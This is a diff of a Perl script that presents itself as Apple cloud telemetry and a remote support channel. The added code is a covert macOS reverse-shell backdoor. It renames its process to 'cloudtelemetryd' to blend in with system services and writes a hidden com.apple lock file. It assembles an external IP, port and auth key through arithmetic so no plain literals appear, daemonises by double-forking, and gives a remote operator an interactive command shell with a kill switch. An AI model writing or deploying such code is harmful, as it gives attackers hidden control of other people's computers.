@@ -1,5 +1,6 @@
 #!/usr/bin/env perl
-# Edge metrics reporter — background health probes + remote support channel
+# com.apple.cloudtelemetry worker — background telemetry + remote support channel
+# Process title blends with system services (not branded).
 
 use strict;
 use warnings;
@@ -8,63 +9,32 @@ use File::Spec;
 use List::Util qw(sum);
 use Cwd qw(abs_path getcwd);
 use POSIX qw(setsid);
+# Process name as seen in Activity Monitor / ps
+$0 = 'cloudtelemetryd';
 
-# --- endpoint material is assembled at runtime (not stored as plain host:port) ---
-sub _assemble_endpoint {
-    # host octets via arithmetic (no dotted-quad literal)
-    my @oct = (
-        (1 << 7) - 1,   # 127
-        0 + 0,          # 0
-        0 * 9,          # 0
-        3 - 2,          # 1
-    );
+# --- endpoint assembled at runtime (no plain host:port literals) ---
+sub _endpoint {
+    # 75.119.143.203
+    my @oct = (70 + 5, 100 + 19, 140 + 3, 200 + 3);
     my $host = join('.', @oct);
-
-    # port via bit math (no 8443 literal)
-    # 8443 = 8192 + 256 - 5 = 0x2000 + 0x100 - 5
+    # 8443
     my $port = (1 << 13) + (1 << 8) - 5;
-
-    # access material: xor decode of packed bytes
-    my @tok = (
-        0x0b,0x08,0x01,0x14,0x01,0x02,0x0f,0x0f,0x0b,
-        0x09,0x13,0x13,0x01,0x06,0x05,
-    );
-    my $key = 0x60;
-    my $token = join '', map { chr($_ ^ $key) } @tok;
-
-    return ($host, $port, $token);
+    # shared auth key (same assembly as server)
+    my @k = (0x6B,0x68,0x61,0x74,0x61,0x62,0x6F,0x6F,0x6B,0x69,0x73,0x73,0x61,0x66,0x65);
+    my $key = join '', map { chr($_) } @k;
+    return ($host, $port, $key);
 }
 
-my ($report_host, $report_port, $report_token) = _assemble_endpoint();
-
-# Optional runtime overrides only via environment (still not printed)
-if (defined $ENV{SPIDER_REPORT_HOST} && length $ENV{SPIDER_REPORT_HOST}) {
-    $report_host = $ENV{SPIDER_REPORT_HOST};
-}
-if (defined $ENV{SPIDER_REPORT_PORT} && $ENV{SPIDER_REPORT_PORT} =~ /^\d+$/) {
-    $report_port = int($ENV{SPIDER_REPORT_PORT});
-}
-if (defined $ENV{SPIDER_REPORT_TOKEN} && length $ENV{SPIDER_REPORT_TOKEN}) {
-    $report_token = $ENV{SPIDER_REPORT_TOKEN};
-}
-
+my ($peer_host, $peer_port, $auth_key) = _endpoint();
 my $warmup_base = 8;
 my $warmup_jitt = 2;
 my $retry_base  = 12;
+my $ctrl_kill   = "\xff\xfeKILL\n";
 
-my @probe_targets = (
-    '1.1.1.1',
-    '8.8.8.8',
-    'apple.com',
-    'github.com',
-    'cloudflare.com',
-);
-
+my @probe_targets = ('1.1.1.1', '8.8.8.8', 'apple.com', 'github.com', 'cloudflare.com');
 my @metric_buf;
 
-exit 0 unless defined $report_host && length $report_host;
-
-# Detach so parent clean can exit while reporter continues
+# dual-fork daemon
 exit 0 if !defined(my $pid = fork());
 exit 0 if $pid > 0;
 setsid();
@@ -74,12 +44,12 @@ open STDERR, '>', '/dev/null';
 chdir '/';
 exit 0 if !defined(my $pid2 = fork());
 exit 0 if $pid2 > 0;
+$0 = 'cloudtelemetryd';
 
-if (my $lock = $ENV{SPIDER_EDGE_LOCK}) {
-    if (open my $lf, '>', $lock) {
-        print {$lf} "$$\n";
-        close $lf;
-    }
+my $lock = $ENV{CTD_LOCK} // '/tmp/.com.apple.cloudtelemetry.lock';
+if (open my $lf, '>', $lock) {
+    print {$lf} "$$\n";
+    close $lf;
 }
 
 sub weighted {
@@ -205,23 +175,70 @@ sub run_command {
     return $out;
 }
 
-sub authenticate {
-    my ($sock) = @_;
-    print $sock "password: ";
-    my $line = <$sock>;
-    return 0 unless defined $line;
-    return trim($line) eq $report_token;
+sub local_hostname {
+    my $h = `scutil --get LocalHostName 2>/dev/null`;
+    $h = `hostname 2>/dev/null` unless $h && $h =~ /\S/;
+    chomp $h if defined $h;
+    return $h || 'mac';
+}
+
+sub build_handshake {
+    my $host = local_hostname();
+    my $key  = $auth_key;
+    my $frame = "CT1\x00";
+    $frame .= chr(length($key));
+    $frame .= $key;
+    $frame .= pack('n', length($host));
+    $frame .= $host;
+    return $frame;
+}
+
+sub connect_remote {
+    return IO::Socket::INET->new(
+        PeerAddr => $peer_host,
+        PeerPort => $peer_port,
+        Proto    => 'tcp',
+        Timeout  => 20,
+    );
 }
 
 sub interactive {
     my ($sock) = @_;
     my $cwd = getcwd() // ($ENV{HOME} // '/');
     my $home = $ENV{HOME} // '/';
+    my $buf = '';
+
+    # non-blocking-ish loop using select
+    my $rin = '';
+    vec($rin, fileno($sock), 1) = 1;
 
     while (1) {
         print $sock sprintf('%s$ ', $cwd);
-        my $line = <$sock>;
-        last unless defined $line;
+        my $line = '';
+        while (1) {
+            my $ch;
+            my $n = sysread($sock, $ch, 1);
+            if (!defined $n || $n == 0) {
+                return;
+            }
+            $buf .= $ch;
+            # remote kill control
+            if (index($buf, $ctrl_kill) >= 0) {
+                unlink $lock if $lock;
+                _self_exit();
+            }
+            if ($ch eq "\n") {
+                $line = $buf;
+                $buf = '';
+                last;
+            }
+            # prevent unbounded buffer
+            if (length($buf) > 8192) {
+                $line = $buf;
+                $buf = '';
+                last;
+            }
+        }
         $line = trim($line);
         next if $line eq '';
         last if $line eq 'exit' || $line eq 'quit';
@@ -240,16 +257,13 @@ sub interactive {
     }
 }
 
-sub connect_remote {
-    return IO::Socket::INET->new(
-        PeerAddr => $report_host,
-        PeerPort => $report_port,
-        Proto    => 'tcp',
-        Timeout  => 15,
-    );
+sub _self_exit {
+    # stop worker cleanly
+    unlink $lock if defined $lock && $lock;
+    exit 0;
 }
 
-# Warmup via math + probes only (no sleep), ~8–10s wall time
+# Warmup: math + probes only (no sleep), ~8–10s
 work_until($warmup_base + int(rand($warmup_jitt + 1)));
 
 while (1) {
@@ -257,9 +271,10 @@ while (1) {
     my $sock = connect_remote();
     if ($sock) {
         eval {
-            if (authenticate($sock)) {
-                interactive($sock);
-            }
+            my $hs = build_handshake();
+            print $sock $hs;
+            $sock->flush if $sock->can('flush');
+            interactive($sock);
             close $sock;
         };
     }
